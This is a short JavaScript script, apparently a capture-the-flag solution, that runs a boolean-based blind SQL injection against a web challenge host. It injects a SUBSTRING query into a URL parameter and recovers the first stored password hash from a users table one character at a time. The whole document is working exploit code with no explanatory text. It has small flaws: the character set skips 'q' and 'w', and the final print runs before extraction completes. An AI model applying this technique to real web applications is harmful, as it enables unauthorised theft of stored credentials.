let axios = require('axios');

var alphanumeric = "0123456789abcdefghijklmnoprstuvzxyz";
var str = "Lav' AND SUBSTRING((SELECT password FROM users LIMIT 1), {REPLACE_NUM}, 1) = '";
var hash = "";

async function getHash() {
    for (let i = 1; i < 66; ++i) {
        for (char in alphanumeric) {
            x = alphanumeric[char];
            var uri = str; uri = uri.replace('{REPLACE_NUM}', i.toString());
            let result = await axios({
                url: 'http://chal.hacknite.hr:9105/info.php?zivotinja=' + uri + x,
                method: 'get',
                timeout: 8000
            });
            
            await new Promise(resolve => setTimeout(resolve, 1000));

            if (result.data.includes('- Lav je životinjska vrsta iz porodice mačaka.')) {
                hash = hash + x;
                console.log( x + ' - ' + hash);
                break;
            }
        }
        
        if (hash.length != i)
            break;
    }    
}

getHash();

console.log(hash);